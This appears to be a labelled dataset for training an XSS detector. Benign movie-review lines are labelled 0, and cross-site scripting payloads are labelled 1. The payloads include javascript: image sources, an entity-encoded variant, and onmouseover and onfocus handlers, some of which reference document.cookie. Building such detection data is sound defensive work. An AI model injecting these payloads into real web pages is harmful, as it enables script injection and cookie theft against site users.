0;Unfortunately, this is a bad movie that is just plain bad.;;;;;;;;;;;;;;;;;
0;Even Billy Bob couldn't rise above the script, which was worse.;;;;;;;;;;;;;;;;;
1;<IMG SRC=javascript:alert('XSS')>;;;;;;;;;;;;;;;;;
1;<img src=&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>;;;;;;;;;;;;;;;;;
1;"<IMG ONMOUSEOVER=""ALERT('XXS')"">";;;;;;;;;;;;;;;;;
0;And the rest of it just sits there being awful... with soldiers singing songs about the masculinity they pledge themselves to, hairsplitting about purity, the admiration of swords, etc.;;;;;;;;;;;;;;;;;
1;<a onmouseover=alert(document.cookie)>xxs link</a>;;;;;;;;;;;;;;;;;
0;Conceptually, the show offers a little bit of everything- and for just about everybody (parents, kids, fantasy and/or fx fans).;;;;;;;;;;;;;;;;;
1;""" onfocus=""alert(1)"" name=""bounty";;;;;;;;;;;;;;;;;
1;"<a onmouseover=""alert(document.cookie)"">xxs link</a>";;;;;;;;;;;;;;;;;
